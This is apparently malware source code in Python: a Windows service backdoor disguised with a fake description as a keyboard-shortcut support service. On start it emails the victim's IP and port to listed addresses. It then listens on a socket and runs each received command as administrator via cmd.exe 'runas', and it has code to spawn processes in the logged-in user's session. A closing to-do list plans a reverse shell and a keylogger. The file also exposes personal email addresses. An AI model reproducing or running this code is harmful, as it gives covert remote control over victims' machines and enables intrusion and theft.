from local_libs import service
from local_libs.mail import Email
from local_libs.config import Config
import servicemanager
import sys

import os
import socket
import requests
import subprocess
import win32comext.shell.shell as shell

import win32ts
import win32profile
import win32process
import win32con


class Main(service.WinService):
    _svc_name_ = "ABC"
    _svc_display_name_ = "ABC"
    _svc_description_ = "Enables and supports the use of keyboard shortcuts on keyboards, remote controls, and other " \
                        "multimedia devices. Disabling this service is not recommended."

    def __init__(self, args):
        super().__init__(args)
        self.is_running = False

        self.commands_log_filepath = r"C:\Users\User\Desktop\backdoor_log.txt"
        self.service_log_filepath = r"C:\Users\User\Desktop\service_log.txt"
        self.config_filepath = r"D:\PROJECTS\PycharmProjects\Python Malware\config.json"

        # self.public_ip = requests.get("https://api.ipify.org").content.decode("utf-8")
        self.ip = socket.gethostbyname(socket.gethostname())
        self.port = 8888

        self.config = Config.initialize(self.config_filepath)
        self.email = Email(self.config.smtp.server, self.config.smtp.credentials)

    def log(self, log_message):
        with open(self.service_log_filepath, "a") as f:
            f.write(log_message + "\n")

    def start(self):
        self.is_running = True
        self.log("Service started")
        self.email.send("dobrioglo0709@outlook.com", "dobrioglo07092006@gmail.com", "Victim",
                        f"IP: {self.ip}\nPORT: {self.port}")

    def run_backdoor(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.ip, self.port))
        s.listen(1)
        server, addr = s.accept()

        greetings = f"Hello from {self.ip}\n" \
                    f"Your cwd is {os.getcwd()}\n" \
                    f"{os.getcwd()} >> "
        server.send(greetings.encode())

        while True:
            command = server.recv(1024 * 4).decode()
            self.log("Executing command: " + command)
            if command == "exit":
                server.send(f"Backdoor was closed".encode())
                s.close()
            try:
                # if command.find("!user") != -1:
                #     self.execute_user_cmd(command)
                # else:
                self.execute_admin_cmd(command)
                server.send(f"Successfully executed\n{os.getcwd()} >> ".encode())
            except:
                server.send(f"An error has occurred\n{os.getcwd()} >> ".encode())

    def execute_user_cmd(self, command):
        console_session_id = win32ts.WTSGetActiveConsoleSessionId()
        console_user_token = win32ts.WTSQueryUserToken(console_session_id)

        environment = win32profile.CreateEnvironmentBlock(console_user_token, False)

        startup_info = win32process.STARTUPINFO()
        startup_info.dwFlags = win32process.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = win32con.SW_NORMAL

        win32process.CreateProcessAsUser(console_user_token,
                                         fr"{command}",
                                         None,
                                         None,
                                         None,
                                         0,
                                         win32con.NORMAL_PRIORITY_CLASS,
                                         environment,
                                         None,
                                         startup_info)

    def execute_admin_cmd(self, command):
        shell.ShellExecuteEx(lpVerb="runas", lpFile="cmd.exe",
                             lpParameters=fr"/c {command} > {self.commands_log_filepath}")

    def main(self):
        self.run_backdoor()

    def stop(self):
        self.is_running = False
        self.log("Service stopped")


if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(Main)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        Main.parse_command_line()

"""
TO DO:
reverse shell
commands executing
module loading
cli

keylogger (as module)
"""
